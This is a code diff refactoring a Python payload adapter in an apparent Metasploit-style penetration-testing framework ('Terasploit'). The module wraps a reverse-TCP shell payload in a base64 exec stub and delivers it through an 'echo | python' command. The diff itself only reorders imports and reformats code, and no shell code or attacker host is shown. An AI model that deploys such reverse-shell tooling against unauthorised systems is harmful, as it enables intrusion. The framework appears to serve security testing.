@@ -3,20 +3,20 @@ import shlex
 from collections.abc import Sequence
 
 from extension.payload.python.python_base import create_exec_stub
-from terasploit.module.payload import (
-    ADAPTER,
-    ARCH_CMD,
+from libs.arch import ARCH_CMD
+from libs.platform import (
     PLATFORM_LINUX,
     PLATFORM_UNIX,
+)
+from terasploit.module.payload import (
+    ADAPTER,
     Payload,
     PayloadHandler,
 )
 
 
 class TerasploitModule(Payload):
-    """
-    cmd/unix adapter that executes a Python payload via echo | python.
-    """
+    """Cmd/unix adapter that executes a Python payload via echo | python."""
 
     NAME: str = "Python Exec (cmd/unix)"
     DESCRIPTION: str = (
@@ -28,7 +28,9 @@ class TerasploitModule(Payload):
     LICENSE: str = "BSD-3-CLAUSE"
     VERSION: str = "1.0"
     RANK: str = "normal"
-    REFERENCES: Sequence = ["https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/adapters/cmd/unix/python.rb"]
+    REFERENCES: Sequence = [
+        "https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/adapters/cmd/unix/python.rb",
+    ]
     PAYLOAD_TYPE: str = ADAPTER
     HANDLER: object = PayloadHandler.ReverseTCP
     WRAPPED_PAYLOAD = "modules.payload.singles.generic.shell_reverse_tcp"
@@ -43,35 +45,29 @@ class TerasploitModule(Payload):
     def generate(self, ctx):
         """Build the echo … | exec python - command string."""
         ctx.info(f"Adapter: loading wrapped Python single from {self.WRAPPED_PAYLOAD!r}...")
-
         try:
             mod = importlib.import_module(self.WRAPPED_PAYLOAD)
             single = mod.TerasploitModule()
-
         except (ImportError, AttributeError) as exc:
             ctx.error(f"Adapter: failed to load wrapped payload: {exc}")
             return b""
 
         ctx.info(f"Adapter: delegating generation to '{single.NAME}'...")
-        raw = single.generate(ctx)
 
+        raw = single.generate(ctx)
         if not raw:
             ctx.error("Adapter: wrapped single returned empty payload.")
             return b""
-
         if not self.compatible(len(raw)):
             ctx.error(
                 f"Adapter: wrapped payload is {len(raw)} bytes - exceeds the {120_000}-byte echo(1) argument limit.  Choose a smaller Python single."
             )
             return b""
-
         try:
             python_source = raw.decode("utf-8")
-
         except UnicodeDecodeError:
             ctx.error("Adapter: wrapped payload is not valid UTF-8 Python source.")
             return b""
-
         if "\n" in python_source:
             ctx.info("Adapter: payload contains newlines - wrapping in base64-exec stub.")
             python_source = create_exec_stub(python_source)
